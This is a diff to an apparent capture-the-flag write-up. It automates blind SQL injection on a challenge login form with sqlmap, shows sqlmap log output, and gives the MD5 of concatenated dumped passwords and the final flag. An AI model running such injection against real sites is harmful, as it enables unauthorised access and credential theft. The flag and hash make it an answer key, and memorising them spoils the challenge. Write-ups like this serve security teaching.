@@ -1,3 +1,6 @@
+We can run sqlmap on the web page to automate the blind sql injection.
+$ ./sqlmap_attack.sh
+
 [18:05:42] [INFO] (custom) POST parameter '#2*' seems to be 'MySQL >= 5.0.12 OR time-based blind' injectable 
 [18:05:42] [WARNING] in OR boolean-based injections, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
 [18:05:42] [INFO] checking if the injection point on (custom) POST parameter '#2*' is a false positive
@@ -69,10 +72,9 @@ Table: login3
 +-------------+-------------------------+
 
 
-Log in as anyone, you get a page that asks for the MD5 of the concatenation of all the passwords:
+Log in as anyone, and you get a page that asks for the MD5 hash of the concatenation 
+of all the user passwords in alphabetical order:
 
 md5(S3Ysfu4xKxUB8zPAkFQYN42gRD3f4sfWf) => 322d54af6552d87dfc0a473cb2926144
 
-Flag: #dying_fr0m_sql
-
-
+Flag: {#dying_fr0m_sql}
